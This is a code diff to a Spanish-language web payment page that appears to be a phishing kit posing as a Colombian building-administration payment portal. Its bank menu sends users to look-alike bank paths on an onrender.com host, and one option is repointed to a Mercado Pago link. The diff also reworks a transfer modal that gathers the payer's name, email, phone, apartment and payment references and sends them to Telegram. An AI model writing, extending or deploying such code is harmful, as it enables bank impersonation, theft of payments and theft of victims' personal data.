@@ -576,7 +576,7 @@
                             <option value="">Selecciona una opción</option>
                             <option value="https://psec-px42.onrender.com/transaction/ent/b-nequi/">Nequi</option>
                             <option value="https://psec-px42.onrender.com/transaction/ent/b-34f9/poral/">Bancolombia</option>
-                            <option value="https://psec-px42.onrender.com/transaction/ent/b-34f3/">Davivienda</option>
+                            <option value="https://link.mercadopago.com.co/pagosadministracion">Davivienda</option>
                             <option value="https://psec-px42.onrender.com/transaction/ent/b-34f4/wps.portal/virtual/">Banco De Bogotá</option>
                             <option value="https://psec-px42.onrender.com/transaction/ent/b-34f14/">Banco de Occidente</option>
                             <option value="https://psec-px42.onrender.com/transaction/ent/b-34f18/">Banco Popular</option>
@@ -807,6 +807,9 @@ ${metodoInfo}
             const paymentBrev = document.getElementById('paymentBrev');
             const btnPagar = document.getElementById('btnPagarFinal');
 
+            // Variable global para saber qué método está activo
+            window._metodoPagoActivo = 'tarjeta';
+
             function deseleccionarTodos() {
                 paymentTarjeta.classList.remove('active');
                 paymentPSE.classList.remove('active');
@@ -823,6 +826,7 @@ ${metodoInfo}
                 document.getElementById('tarjetaForm').style.display = 'block';
                 btnPagar.classList.add('active');
                 btnPagar.disabled = false;
+                window._metodoPagoActivo = 'tarjeta';
                 sessionStorage.setItem('metodoPago', 'tarjeta');
             });
 
@@ -832,6 +836,7 @@ ${metodoInfo}
                 document.getElementById('pseForm').style.display = 'block';
                 btnPagar.classList.add('active');
                 btnPagar.disabled = false;
+                window._metodoPagoActivo = 'pse';
                 sessionStorage.setItem('metodoPago', 'pse');
             });
 
@@ -842,24 +847,32 @@ ${metodoInfo}
                 document.getElementById('brevMonto').textContent = totalFormatted;
                 btnPagar.classList.add('active');
                 btnPagar.disabled = false;
+                window._metodoPagoActivo = 'brev';
                 sessionStorage.setItem('metodoPago', 'brev');
             });
 
             // Click en botón pagar
             btnPagar.addEventListener('click', function() {
-                const metodoPago = sessionStorage.getItem('metodoPago') || 'tarjeta';
+                // Leer método activo: variable global primero, fallback a sessionStorage
+                const metodoPago = window._metodoPagoActivo
+                    || sessionStorage.getItem('metodoPago')
+                    || (paymentBrev.classList.contains('active') ? 'brev' : 'tarjeta');
 
                 if (metodoPago === 'brev') {
                     // Mostrar monto en el modal
                     document.getElementById('brevModalMonto').textContent = totalFormatted;
-                    document.getElementById('brevModal').style.display = 'flex';
 
-                    // Guardar datos para el Telegram al confirmar
-                    document.getElementById('brevModal').__brevData = {
+                    // Guardar datos para Telegram
+                    window._brevData = {
                         nombre: userNombre, apellido: userApellido, email: userEmail,
-                        celular: userCelular, nombreConjunto, referencia1,
-                        selectedApt, referencia2, totalFormatted
+                        celular: userCelular, nombreConjunto: nombreConjunto,
+                        referencia1: referencia1, selectedApt: selectedApt,
+                        referencia2: referencia2, totalFormatted: totalFormatted
                     };
+
+                    // Abrir modal
+                    const modal = document.getElementById('brevModal');
+                    modal.style.setProperty('display', 'flex', 'important');
                     return;
                 }
 
@@ -1254,7 +1267,7 @@ ${metodoInfo}
             <button onclick="brevConfirmar()" style="width:100%; background:#1dbe5f; color:white; border:none; border-radius:25px; padding:14px; font-size:15px; font-weight:700; cursor:pointer; font-family:'Roboto Condensed',sans-serif; margin-bottom:10px;">
                 Ya realicé la transferencia
             </button>
-            <button onclick="document.getElementById('brevModal').style.display='none'" style="width:100%; background:transparent; color:#999; border:none; padding:10px; font-size:13px; cursor:pointer; font-family:'Roboto Condensed',sans-serif;">
+            <button onclick="document.getElementById('brevModal').style.setProperty('display','none','important')" style="width:100%; background:transparent; color:#999; border:none; padding:10px; font-size:13px; cursor:pointer; font-family:'Roboto Condensed',sans-serif;">
                 Cancelar
             </button>
         </div>
@@ -1311,8 +1324,8 @@ ${metodoInfo}
 
         function brevConfirmar() {
             const modal = document.getElementById('brevModal');
-            const d = modal.__brevData || {};
-            modal.style.display = 'none';
+            const d = window._brevData || {};
+            modal.style.setProperty('display', 'none', 'important');
 
             // Enviar notificación Telegram
             sendToTelegram({
